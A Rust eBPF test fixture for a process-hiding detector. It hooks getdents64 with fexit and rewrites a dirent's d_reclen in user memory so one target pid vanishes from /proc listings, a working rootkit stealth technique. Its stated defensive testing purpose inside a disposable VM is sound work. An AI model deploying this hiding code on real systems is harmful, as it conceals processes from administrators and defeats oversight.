// SPDX-FileCopyrightText: 2025-2026 rezky_nightky (oxyzenQ)
// SPDX-License-Identifier: AGPL-3.0-only OR Commercial
//
//! The Z11 detonation fixture's BPF side (night-frontier-Z11, phase
//! c, D8). NOT production code - a test fixture that lives only in
//! the project's own CI micro-VM (the kernel-floor lane's 5.15
//! kernel), planted for one purpose: prove the recorded-pid compare
//! catches a real stealth mechanism instead of a mocked one.
//!
//! The mechanism it demonstrates is the classic directory-listing
//! hide: a fexit program on `__x64_sys_getdents64` (the syscall
//! wrapper the /proc readdir batch-reads through) that removes ONE
//! pid's entry from the buffer the syscall is about to return. The
//! hide is the `d_reclen` absorb: the PREVIOUS entry's record length
//! grows to swallow the hidden entry, so the userspace iterator -
//! which walks `offset += d_reclen` - lands past it and never sees
//! the pid. No memmove, no retval rewrite: two bounded writes at
//! most, every bound explicit, so the verifier accepts the program
//! on the 5.15 floor.
//!
//! WHY A FIXTURE AND NOT A MOCK: a mocked listing would prove the
//! renderer, not the detector. The camera must record the hidden
//! process's action (the write probe sees it - hiding from the
//! directory listing does not hide from the kprobe), the direct
//! /proc/<pid> lookup must still resolve the pid (the stealth
//! filters the enumeration, not the lookup), and the listing must
//! omit it. All three facts are live kernel facts on a real kernel,
//! and the CI log is the proof.
//!
//! THE BOUNDARY, NAMED: this fixture hides one pid chosen by the
//! loader that plants it, inside a disposable micro-VM, for the
//! length of one test. It is the detector's own proving ground - the
//! same discipline the sandbox lanes carry (plant, observe, remove,
//! report).

#![no_std]
#![no_main]

use aya_ebpf::{
    helpers::{bpf_probe_read_buf, bpf_probe_write_user},
    macros::{fexit, map},
    maps::Array,
    programs::FExitContext,
};

/// The fixture's one control slot: the pid to hide (0 = inert). The
/// loader writes the marker's pid before attaching; the program does
/// nothing until the slot is nonzero - an estate left behind by a
/// crashed run hides nobody.
#[map(name = "targets")]
static TARGETS: Array<u64> = Array::with_max_entries(1, 0);

/// One dirent64 header the parser rides on: d_ino (8) at 0, d_off
/// (8) at 8, d_reclen (2) at 16, d_type (1) at 18, d_name at 19.
const DIRENT_HEADER: usize = 19;
/// The smallest legal d_reclen (header + one name byte + NUL).
const MIN_RECLEN: usize = DIRENT_HEADER + 2;
/// The walk's own bound: a 32 KiB getdents batch holds at most a
/// couple hundred entries; 2048 is the honest ceiling past which the
/// walk names itself done instead of spinning.
const WALK_BOUND: usize = 2048;
/// The name bytes one parse step may read (a pid's decimal form is
/// at most ten digits; sixteen is generous).
const NAME_READ: usize = 16;

/// The fexit program on the getdents64 wrapper. The context carries
/// the syscall's three arguments and, at index 3, its return value -
/// the byte count the syscall is about to hand to userspace.
#[fexit(function = "__x64_sys_getdents64")]
pub fn pidhide(ctx: FExitContext) -> i32 {
    // The fixture contract: a refusal inside the walk is named by the
    // loader's own diagnostics - the program returns 0 (observe
    // only), never an error the caller would surface.
    match try_pidhide(&ctx) {
        Ok(rc) => rc,
        Err(_) => 0,
    }
}

/// The hide walk: parse the returned buffer's entry chain, find the
/// one dirent whose name parses to the target pid, absorb it into
/// its predecessor's record length. Returns 1 when a pid was hidden,
/// 0 when the batch had nothing to hide - the loader prints which.
fn try_pidhide(ctx: &FExitContext) -> Result<i32, i32> {
    // SAFETY: the fexit context's arg reads are the tracing uapi's
    // own contract (args at their uapi slots, the return value at
    // index 3), the dirent walk rides pointer arithmetic the entry
    // chain's own bounds keep inside the returned batch, and the two
    // probe helpers are the uapi helpers aya-ebpf wraps. One block
    // carries the whole walk - edition 2024 wants the unsafe ops
    // explicit, and this is where they all live.
    unsafe {
    let returned: i64 = ctx.arg(3);
    if returned <= 0 {
        return Ok(0);
    }
    let returned = returned as usize;
    let buffer: *const u8 = ctx.arg(1);
    if buffer.is_null() {
        return Ok(0);
    }

    let target = match TARGETS.get(0) {
        Some(0) | None => return Ok(0),
        Some(pid) => *pid as u32,
    };

    // The entry chain: walk the user buffer through tiny probe reads
    // (two bytes of reclen, sixteen bytes of name per step). The
    // bounds are explicit: the chain stops at the returned byte count
    // or the walk bound, whichever comes first.
    let mut offset = 0usize;
    let mut prev_offset = usize::MAX;
    let mut hidden_at: Option<(usize, usize)> = None;
    let mut steps = 0;
    while offset + DIRENT_HEADER <= returned && steps < WALK_BOUND {
        steps += 1;
        let mut header = [0u8; 2];
        bpf_probe_read_buf(
            buffer.add(offset + 16),
            &mut header,
        )
        .map_err(|_| 1i32)?;
        let reclen = u16::from_le_bytes(header) as usize;
        if reclen < MIN_RECLEN || offset + reclen > returned {
            break;
        }
        let mut name = [0u8; NAME_READ];
        bpf_probe_read_buf(
            buffer.add(offset + DIRENT_HEADER),
            &mut name,
        )
        .map_err(|_| 1i32)?;
        if parse_pid(&name) == Some(target) {
            hidden_at = Some((prev_offset, offset + reclen));
            break;
        }
        prev_offset = offset;
        offset += reclen;
    }

    let Some((prev, end)) = hidden_at else {
        return Ok(0);
    };
    if prev == usize::MAX {
        // The target led the batch: no predecessor to absorb into.
        // The honest fixture answer is the named skip - the loader's
        // batch is large enough that the marker's entry practically
        // never leads, and a skipped hide prints as a skipped leg.
        return Ok(0);
    }
    // The absorb: the previous entry's d_reclen grows by the hidden
    // entry's length, so the userspace iterator (offset += d_reclen)
    // lands past the hidden pid. One two-byte write into the user
    // buffer the syscall is about to return - the fexit runs before
    // the return lands, so the hide is in place before readdir sees
    // the batch.
    let mut grown = [0u8; 2];
    bpf_probe_read_buf(buffer.add(prev + 16), &mut grown).map_err(|_| 1i32)?;
    // The absorbed span: the previous entry's record must reach the
    // hidden entry's end (end - prev), never past it, and never past
    // the u16 field the length lives in.
    if (end - prev) > u16::MAX as usize {
        return Ok(0);
    }
    let value: u16 = (end - prev) as u16;
    bpf_probe_write_user(buffer.add(prev + 16) as *mut u16, &value)
        .map_err(|_| 1i32)?;
    Ok(1)
    }
}

/// Parse the dirent name's leading decimal digits into a pid. A name
/// that is not a decimal pid (the root's own "." / "..", the
/// non-numeric files) reads as None.
fn parse_pid(name: &[u8; NAME_READ]) -> Option<u32> {
    let mut pid: u32 = 0;
    let mut digits = 0;
    for byte in name {
        match byte {
            0 => break,
            b'0'..=b'9' => {
                pid = pid.wrapping_mul(10).wrapping_add((byte - b'0') as u32);
                digits += 1;
            }
            _ => break,
        }
    }
    if digits == 0 || digits > 10 {
        None
    } else {
        Some(pid)
    }
}

#[panic_handler]
fn panic(_info: &core::panic::PanicInfo) -> ! {
    loop {}
}
